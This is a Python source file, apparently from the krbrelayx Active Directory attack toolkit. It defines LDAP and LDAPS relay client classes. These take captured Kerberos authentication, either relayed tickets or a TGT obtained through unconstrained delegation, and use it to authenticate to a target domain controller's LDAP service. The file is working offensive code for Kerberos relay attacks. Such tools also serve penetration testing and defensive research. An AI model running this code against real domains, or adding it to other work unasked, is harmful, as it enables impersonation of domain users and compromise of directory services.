import sys
from struct import unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, SASL, KERBEROS
from ldap3.operation import bind
try:
    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
except ImportError:
    LOG.fatal("krbrelayx requires ldap3 > 2.0. To update, use: pip install ldap3 --upgrade")
    sys.exit(1)

from impacket.examples.krbrelayx.clients import ProtocolClient
from impacket.examples.krbrelayx.utils.kerberos import ldap_kerberos, ldap_kerberos_auth
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]

class LDAPRelayClientException(Exception):
    pass

class LDAPRelayClient(ProtocolClient):
    PLUGIN_NAME = "LDAP"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.server = None

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self, authdata, kdc=None):
        if not kdc:
            kdc = authdata['domain']
        self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=SASL, sasl_mechanism=KERBEROS)
        if self.serverConfig.mode == 'RELAY':
            # Pass-thought auth
            ldap_kerberos_auth(self.session, authdata['krbauth'])
        else:
            # Unconstrained delegation mode
            ldap_kerberos(authdata['domain'], kdc, authdata['tgt'], authdata['username'], self.session, self.targetHost)

class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self, authdata, kdc=None):
        if not kdc:
            kdc = authdata['domain']
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=SASL, sasl_mechanism=KERBEROS)
        ldap_kerberos(authdata['domain'], kdc, authdata['tgt'], authdata['username'], self.session, self.targetHost)
